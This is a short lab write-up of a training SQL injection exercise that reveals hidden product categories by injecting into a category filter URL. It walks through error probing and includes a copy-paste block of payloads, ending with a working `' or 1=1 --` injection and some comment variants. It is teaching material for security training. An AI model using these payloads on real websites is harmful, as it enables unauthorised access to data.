# SQL Injection Lab – **SHOW HIDDEN DATA**

A concise write‑up using **my original steps** (verbatim) with small, accurate notes and payload blocks.

---

## 🥅 Goal
**SHOW HIDDEN DATA** (all categories, including any hidden ones).

---

## ✅ My Exact Steps (Verbatim)

1. **Understanding the GOAL, SHOW HIDDEN DATA**

2. **My first step is always to click everywhere, spam the website with clicks.**

3. **i Found 2 urls, first i tried `productId=payload` and it didn't seem to click**

4. **in another url i found that `/filter?category=Gifts'` raising an error 500 - internal server error.**

5. **Fixing the issue: `/filter?category=Gifts''`**

6. **Connecting finding to our goal, we need to show all categories (some might be hidden)**

7. **Exploiting further: `/filter?category=Gifts'+or+1=1'` -> still raising an error.**

8. **Assumption: Query goes like this:**
   ```sql
   SELECT * FROM products WHERE category='Gifts'+or+1=1''
   ```

9. **SQL Raise en error because getting a literal string at the end (`''`)**

10. **Solution: We will try to comment the end of the line: `/filter?category=Gifts'+or+1=1+--+`**

11. **Lab Solved!**

## 🧠 Minimal Additions (Why This Works)

- The server likely builds a query like:
  ```sql
  SELECT * FROM products WHERE category = '<USER_INPUT>'
  ```
  When we send `Gifts'+or+1=1'`, we break out of `'Gifts'` and inject `OR 1=1` which makes the predicate **always true**.

- The error happens because there is an **extra trailing quote** (`''`). To avoid the parser error, we **comment out** the rest of the line.

- `--` is a SQL single‑line comment in many databases. It comments out everything **to the end of the line**. We add a trailing space after `--` so the server does not append any more tokens. In URLs, a space is often encoded as `+`, so `--+` ensures the comment is effective.

- `+` in these URLs represents a **space** (URL‑encoded space). So `or+1=1` is the same as `OR 1=1`.

## 🔧 Payloads I Used (Copy/Paste)

```text
/filter?category=Gifts'
/filter?category=Gifts''
/filter?category=Gifts'+or+1=1'
/filter?category=Gifts'+or+1=1+--+
```

> Use them in order; the last one is the **working** payload that reveals **all categories** (including hidden).

## 🧩 Notes

- If the backend trims/normalizes whitespace differently, you can also try comment variants like `-- -`, `--%20`, or inline comments (e.g., `/* ... */`) depending on DB flavor.
- The objective is to **neutralize** the remaining `'` and any **trailing syntax** the application appends to your input.

## 🏁 Result
All categories (visible + hidden) are shown. **Lab Solved. ✅**
